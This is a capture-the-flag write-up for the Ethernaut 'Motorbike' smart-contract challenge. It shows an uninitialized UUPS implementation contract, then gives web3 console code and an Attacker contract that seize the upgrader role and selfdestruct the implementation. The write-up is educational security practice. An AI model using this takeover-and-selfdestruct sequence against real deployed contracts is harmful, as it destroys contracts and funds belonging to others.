# 25. Motorbike

Ethernaut's motorbike has a brand new upgradeable engine design.

Would you be able to selfdestruct its engine and make the motorbike unusable ?

## Target contract

```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    struct AddressSlot {
        address value;
    }
    
    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`. 
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }
    
    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
    
    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        
        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

## Vulnerability

If you look carefully, the Engine contract is not initialized. One might think that it is given that `Motorbike` makes this call in its constructor : ` (bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));` but it's a delegated call, so `Engine` is initialized inside `Motorbike` context, not inside it's own context.

Let's take advantage of that.

First, initialize the accounts in the console :

```js
const accounts = await web3.eth.getAccounts();
```

Now let's get the address of the implementation (`Engine`) from the proxy (`Motorbike`) contract:

```js
// Read storage slot 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc which contains the address on 32 bytes
const implementationSlot = await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc");
// Skip 0x and the first 12 bytes to get the address value on 20 bytes
const implementationAddress = implementation.slice(26);
```

We can now prepare and send a call to `initialize` to take control of the `Engine` implementation :

```js
const callData = web3.eth.abi.encodeFunctionCall({name: "initialize", type:'function', inputs:[]}, []);
await web3.eth.sendTransaction({from: accounts[0], to: implementationAddress, data:callData})
```

Alright, all we need to do now is to selfdestruct that contract. We will do that by taking advantage of the delegatecall that is insude the `upgradeToAndCall` function to target our own contract that will be executed inside `Engine`'s context.

Deploy the following contract :

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {

    address owner;

    constructor() {
        owner = msg.sender;
    }

    function kill() public {
        selfdestruct(payable(owner));
    }
}
```

And save its address:

```js
// Change the address to whatever your Attacker contract was deployed at
const attackerAddress = "0xe892b0AaCe69e880DF1356daa0436D978203EbA8"
```

All there is left to do is to craft a message for `upgradeToAndCall` that will upgrage to our `attackerContract` and make a delegated call to it :

```js
// Generate the data for a call to the kill function of our Attacker contract
const callDataKill = web3.eth.abi.encodeFunctionCall({name: "kill", type:'function', inputs:[]}, []);

// Generate the data for a call to the upgradeToAndCall function, giving it as parameter our Attacker contract address
// as well as the encoded call to the kill function that we generated just before.
const callData = web3.eth.abi.encodeFunctionCall({name: "upgradeToAndCall", type:'function', inputs:[{type:'address', name:'newImplementation'},{type:'bytes', name:'data'}]}, [attackerAddress, callDataKill]);
```

Everything is ready, we just need to send this data to the `Engine` contract :

```js
await web3.eth.sendTransaction({from: accounts[0], to: implementationAddress, data:callData});
```

The `Engine` contract has self destructed, you can submit the challenge !